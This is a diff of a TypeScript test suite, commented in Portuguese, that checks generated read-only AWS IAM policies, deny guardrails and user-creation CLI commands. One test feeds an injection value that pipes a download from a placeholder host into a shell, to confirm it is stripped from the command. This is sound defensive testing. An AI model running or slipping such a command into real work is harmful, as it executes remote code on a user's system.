@@ -15,6 +15,9 @@ import {
   isGcpPrivateKeyShape,
 } from './cloud-credentials.js';
 import {
+  AWS_READER_CAPABILITY_ACTIONS,
+  AWS_READER_SELF_ACTIONS,
+  AWS_READER_USER_SELF_ACTIONS,
   awsGuardrailsPolicy,
   awsReaderUserArn,
   awsReaderUserCommands,
@@ -23,6 +26,7 @@ import {
   gcpReaderSubscription,
   type IamPolicy,
 } from './read-keys.js';
+import { AWS_READER_CAPABILITIES, type AwsReaderCapability, parseReaderRoleTags } from './aws-reader.js';
 import { isPubsubSubscriptionName } from './cloud-accounts.js';
 
 // Chaves geradas na hora, no formato da AWS e do Google: nenhuma chave real no repositório.
@@ -164,12 +168,44 @@ describe('o usuário IAM de leitura da AWS', () => {
   const bySid = (policy: IamPolicy) =>
     new Map(policy.Statement.map((statement) => [statement.Sid, statement]));
 
-  it('a leitura é a do papel: as mesmas ações, com a autoinspeção no próprio usuário', () => {
+  /** As declarações que cada capacidade soma à política de leitura, no papel e no usuário. */
+  const CAPABILITY_SIDS: Record<AwsReaderCapability, readonly string[]> = {
+    discovery: ['AutoInspecao', 'ValidarFontes', 'PosturaEAtivos', 'DescobrirFontes'],
+    'service-logs': [
+      'LerLogsDaAwsDestaConta',
+      'ListarLogsDaAwsDestaConta',
+      'VerPrimeiroNivelDosBuckets',
+      'DecifrarLogsDaAwsSoPeloS3',
+    ],
+    findings: ['LerAchadosDeSeguranca'],
+    'log-groups': ['LerGruposDeLogEtiquetados'],
+  };
+  const BUCKET_SIDS = ['ListarBucketsDeLog', 'LerObjetosDeLog'];
+  const actionsOf = (policy: IamPolicy, sids: readonly string[]) =>
+    new Set(
+      policy.Statement.filter((statement) => sids.includes(statement.Sid)).flatMap((statement) =>
+        [statement.Action].flat(),
+      ),
+    );
+
+  it('a leitura é a do papel: as mesmas declarações, com a autoinspeção no próprio usuário', () => {
     const user = bySid(awsReaderUserPolicy(values));
     const reader = bySid(role.VeraxControlReader);
-    for (const sid of ['ValidarFontes', 'PosturaEAtivos', 'ListarBucketsDeLog', 'LerObjetosDeLog']) {
-      expect(user.get(sid)?.Action).toEqual(reader.get(sid)?.Action);
+    // As mesmas declarações, na mesma ordem (o exemplo do papel tem três buckets; o usuário, dois).
+    expect([...user.keys()]).toEqual([...reader.keys()]);
+    for (const sid of user.keys()) {
+      if (sid === 'AutoInspecao') continue;
+      expect(user.get(sid)?.Action, sid).toEqual(reader.get(sid)?.Action);
+      expect(user.get(sid)?.Effect, sid).toBe('Allow');
+      // Fora os buckets cadastrados, o recurso e a condição são os do papel, com a conta deste usuário.
+      if (!BUCKET_SIDS.includes(sid)) {
+        expect(user.get(sid)?.Resource, sid).toEqual(reader.get(sid)?.Resource);
+        expect(user.get(sid)?.Condition, sid).toEqual(reader.get(sid)?.Condition);
+      }
     }
+    // A autoinspeção: as etiquetas e a simulação, no próprio usuário (no papel, no próprio papel).
+    expect(reader.get('AutoInspecao')?.Action).toEqual([...AWS_READER_SELF_ACTIONS]);
+    expect(user.get('AutoInspecao')?.Action).toEqual([...AWS_READER_USER_SELF_ACTIONS]);
     expect(user.get('AutoInspecao')?.Resource).toBe(awsReaderUserArn('111111111111'));
     expect(awsReaderUserArn('111111111111')).toBe(
       'arn:aws:iam::111111111111:user/verax/verax-control-reader',
@@ -178,41 +214,161 @@ describe('o usuário IAM de leitura da AWS', () => {
       'arn:aws:s3:::trilha-111111111111',
       'arn:aws:s3:::guardduty-111111111111',
     ]);
-    expect(user.get('DecifrarSoPeloS3')).toMatchObject({
+    // Os logs da AWS: só a pasta desta conta, e o Decrypt só pelo S3.
+    expect(user.get('LerLogsDaAwsDestaConta')?.Resource).toEqual([
+      'arn:aws:s3:::*/AWSLogs/111111111111/*',
+      'arn:aws:s3:::*/AWSLogs/o-*/111111111111/*',
+    ]);
+    expect(user.get('VerPrimeiroNivelDosBuckets')?.Condition).toEqual({
+      StringEquals: { 's3:delimiter': '/', 's3:prefix': ['', 'AWSLogs', 'AWSLogs/'] },
+    });
+    expect(user.get('DecifrarLogsDaAwsSoPeloS3')).toMatchObject({
+      Resource: '*',
+      Condition: { StringLike: { 'kms:ViaService': 's3.*.amazonaws.com' } },
+    });
+    expect(user.get('LerGruposDeLogEtiquetados')?.Condition).toEqual({
+      StringEquals: { 'aws:ResourceTag/verax-control': 'leitura' },
+    });
+    // Nenhuma ação de escrita na leitura, e nenhum curinga numa ação liberada.
+    const actions = awsReaderUserPolicy(values).Statement.flatMap((statement) => [statement.Action].flat());
+    expect(
+      actions.filter((action) =>
+        /:(Put|Create|Delete|Update|Attach|Tag|Untag|Enable|Disable|Start|Stop)/.test(action),
+      ),
+    ).toEqual([]);
+    expect(actions.filter((action) => action.includes('*'))).toEqual([]);
+  });
+
+  it('as ações de cada capacidade são as do template, declaração por declaração', () => {
+    const reader = role.VeraxControlReader;
+    for (const capability of AWS_READER_CAPABILITIES) {
+      expect(new Set(AWS_READER_CAPABILITY_ACTIONS[capability]), capability).toEqual(
+        actionsOf(reader, CAPABILITY_SIDS[capability]),
+      );
+    }
+    // Tudo o que o papel pode fazer está numa capacidade: os buckets adicionais só repetem ações delas.
+    const every = new Set(Object.values(AWS_READER_CAPABILITY_ACTIONS).flat());
+    expect(new Set(reader.Statement.flatMap((statement) => [statement.Action].flat()))).toEqual(every);
+    expect(reader.Statement.every((statement) => statement.Effect === 'Allow')).toBe(true);
+  });
+
+  it('cada autorização soma só as declarações dela; sem nenhuma, só a descoberta', () => {
+    const sidsOf = (capabilities: readonly AwsReaderCapability[], buckets: readonly string[] = []) =>
+      awsReaderUserPolicy({ ...values, buckets, capabilities }).Statement.map((statement) => statement.Sid);
+    expect(sidsOf([])).toEqual(CAPABILITY_SIDS.discovery);
+    expect(sidsOf(['discovery'])).toEqual(CAPABILITY_SIDS.discovery);
+    for (const capability of ['service-logs', 'findings', 'log-groups'] as const) {
+      expect(sidsOf([capability])).toEqual([...CAPABILITY_SIDS.discovery, ...CAPABILITY_SIDS[capability]]);
+    }
+    expect(sidsOf(['log-groups', 'service-logs'])).toEqual([
+      ...CAPABILITY_SIDS.discovery,
+      ...CAPABILITY_SIDS['service-logs'],
+      ...CAPABILITY_SIDS['log-groups'],
+    ]);
+    // Sem a lista, as três (o padrão do template).
+    expect(
+      awsReaderUserPolicy({ ...values, buckets: [] }).Statement.map((statement) => statement.Sid),
+    ).toEqual(AWS_READER_CAPABILITIES.flatMap((capability) => CAPABILITY_SIDS[capability]));
+    // Um texto qualquer na lista não liga nada.
+    expect(sidsOf(['admin' as AwsReaderCapability])).toEqual(CAPABILITY_SIDS.discovery);
+  });
+
+  it('os buckets cadastrados: listar e ler; a chave deles, só pelo S3 e só sem a autorização dos logs da AWS', () => {
+    const withLogs = bySid(awsReaderUserPolicy(values));
+    expect(withLogs.has('ListarBucketsDeLog')).toBe(true);
+    expect(withLogs.has('DecifrarSoPeloS3')).toBe(false);
+    const withoutLogs = bySid(awsReaderUserPolicy({ ...values, capabilities: ['findings'] }));
+    expect(withoutLogs.has('DecifrarLogsDaAwsSoPeloS3')).toBe(false);
+    expect(withoutLogs.get('DecifrarSoPeloS3')).toMatchObject({
+      Action: 'kms:Decrypt',
       Resource: 'arn:aws:kms:*:111111111111:key/*',
       Condition: { StringLike: { 'kms:ViaService': 's3.*.amazonaws.com' } },
     });
-    // Nenhuma ação de escrita na leitura.
-    const actions = awsReaderUserPolicy(values).Statement.flatMap((statement) => [statement.Action].flat());
-    expect(actions.filter((action) => /:(Put|Create|Delete|Update|Attach)/.test(action))).toEqual([]);
+    // Sem bucket e sem a autorização, nada de S3 nem KMS além da descoberta.
+    const none = awsReaderUserPolicy({ ...values, buckets: [], capabilities: [] });
+    const content = none.Statement.flatMap((statement) => [statement.Action].flat()).filter((action) =>
+      ['s3:GetObject', 's3:ListBucket', 'kms:Decrypt'].includes(action),
+    );
+    expect(content).toEqual([]);
   });
 
-  it('sem bucket, nada de S3 nem KMS; as leituras da postura continuam', () => {
-    const sids = awsReaderUserPolicy({ ...values, buckets: [] }).Statement.map((statement) => statement.Sid);
-    expect(sids).toEqual(['AutoInspecao', 'ValidarFontes', 'PosturaEAtivos']);
+  it('a política de leitura cabe no limite do IAM com dez buckets de nome longo e tudo autorizado', () => {
+    const buckets = Array.from(
+      { length: 10 },
+      (_, index) => `bucket-de-log-com-nome-longo-${index}-111111111111`,
+    );
+    for (const capabilities of [[...AWS_READER_CAPABILITIES], []] as AwsReaderCapability[][]) {
+      const policy = awsReaderUserPolicy({ ...values, buckets, capabilities });
+      expect(JSON.stringify(policy).length).toBeLessThan(6144);
+    }
+    expect(JSON.stringify(awsGuardrailsPolicy(values)).length).toBeLessThan(6144);
   });
 
   it('as negações são as do papel; a de IP só com o IP da VM', () => {
     const guardrails = bySid(awsGuardrailsPolicy(values));
     const reference = bySid(role.VeraxControlGuardrails);
-    for (const sid of ['NuncaAlterarLogs', 'NuncaAmpliarOProprioAcesso']) {
-      expect(guardrails.get(sid)?.Action).toEqual(reference.get(sid)?.Action);
+    expect([...guardrails.keys()]).toEqual([...reference.keys()]);
+    for (const sid of [
+      'NuncaAlterarLogs',
+      'NuncaAlterarOutrasFontes',
+      'NuncaTrocarAsPropriasEtiquetas',
+      'NuncaAmpliarOProprioAcesso',
+    ]) {
+      expect(guardrails.get(sid)?.Action, sid).toEqual(reference.get(sid)?.Action);
+      expect(guardrails.get(sid)).toMatchObject({ Effect: 'Deny', Resource: '*' });
+      expect(guardrails.get(sid)?.Condition).toBeUndefined();
     }
+    // A negação de IP, com a exceção do serviço da AWS que age em nome do usuário (o S3 pedindo ao KMS).
     expect(guardrails.get('SoDoNoDaVerax')?.Condition).toEqual({
       NotIpAddress: { 'aws:SourceIp': ['203.0.113.10/32'] },
+      Bool: { 'aws:ViaAWSService': 'false' },
     });
+    expect(guardrails.get('SoDoNoDaVerax')).toEqual(reference.get('SoDoNoDaVerax'));
     for (const egressIps of [[], ['203.0.113.10'], ['203.0.113.10/24']]) {
       expect(bySid(awsGuardrailsPolicy({ egressIps })).has('SoDoNoDaVerax')).toBe(false);
     }
+    // Nenhuma negação cancela uma leitura liberada (a comparação de ações do IAM não distingue maiúsculas).
+    const denied = awsGuardrailsPolicy({ egressIps: [] }).Statement.flatMap((statement) =>
+      [statement.Action].flat(),
+    );
+    const allowed = awsReaderUserPolicy(values).Statement.flatMap((statement) => [statement.Action].flat());
+    const cancelled = allowed.filter((action) =>
+      denied.some((pattern) =>
+        pattern.endsWith('*')
+          ? action.toLowerCase().startsWith(pattern.slice(0, -1).toLowerCase())
+          : action.toLowerCase() === pattern.toLowerCase(),
+      ),
+    );
+    expect(cancelled).toEqual([]);
   });
 
-  it('os comandos criam o usuário com o limite de permissões e as duas políticas, e a chave', () => {
+  it('os comandos criam o usuário com o limite de permissões, as etiquetas e as duas políticas, e a chave', () => {
     const commands = awsReaderUserCommands('111111111111');
     expect(commands).toContain(
       'aws iam create-user --path /verax/ --user-name verax-control-reader --permissions-boundary arn:aws:iam::111111111111:policy/verax/VeraxControlReader',
     );
     expect(commands).toContain('policy/verax/VeraxControlGuardrails');
     expect(commands).toContain('aws iam create-access-key --user-name verax-control-reader');
+    // As etiquetas do usuário são as do papel: o modelo e o que foi autorizado, separado por espaço.
+    expect(commands).toContain(
+      " --tags Key=verax-control:template,Value=2 'Key=verax-control:capabilities,Value=discovery service-logs findings log-groups'\n",
+    );
+    expect(awsReaderUserCommands('111111111111', ['findings'])).toContain(
+      " --tags Key=verax-control:template,Value=2 'Key=verax-control:capabilities,Value=discovery findings'\n",
+    );
+    // Um texto qualquer na lista não entra no comando que o cliente cola no terminal.
+    const hostile = awsReaderUserCommands('111111111111', [
+      "x' ; curl exemplo.invalid | sh #" as AwsReaderCapability,
+    ]);
+    expect(hostile).toContain("'Key=verax-control:capabilities,Value=discovery'\n");
+    expect(hostile).not.toContain('curl');
+    // E o nó lê de volta o que o comando gravou.
+    expect(
+      parseReaderRoleTags([
+        { Key: 'verax-control:template', Value: '2' },
+        { Key: 'verax-control:capabilities', Value: 'discovery findings' },
+      ]),
+    ).toEqual({ templateVersion: 2, capabilities: ['discovery', 'findings'] });
   });
 });
 
